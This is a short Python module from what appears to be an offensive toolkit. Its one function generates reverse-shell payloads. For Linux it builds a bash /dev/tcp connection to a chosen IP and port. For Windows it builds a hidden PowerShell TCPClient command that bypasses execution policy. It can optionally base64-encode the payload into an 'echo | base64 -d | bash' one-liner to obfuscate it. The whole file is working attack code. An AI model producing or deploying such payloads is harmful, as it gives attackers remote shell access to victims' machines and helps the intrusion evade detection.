import base64
from . import obfus_enc

def generate_reverse_shell(os, ip, port, obfuscate=None):
    result = {
        "os": os,
        "ip": ip,
        "port": port,
        "obfuscate": obfuscate,
        "payload": None
    }

    if os == "linux":
        shell = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1\n"
    elif os == "windows":
        shell = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
    else:
        result["error"] = "OS tidak dikenali (hanya linux/windows)"
        return result

    if obfuscate:
        try:
            with open(obfuscate, "w") as f:
                f.write(shell)

            encoded = obfus_enc.encode_payload(obfuscate, use_base64=True)
            if encoded.get("base64_encoded"):
                result["payload"] = f"echo {encoded['base64_encoded']} | base64 -d | bash"
            else:
                result["payload"] = shell
        except Exception as e:
            result["error"] = str(e)
            result["payload"] = shell
    else:
        result["payload"] = shell

    return result
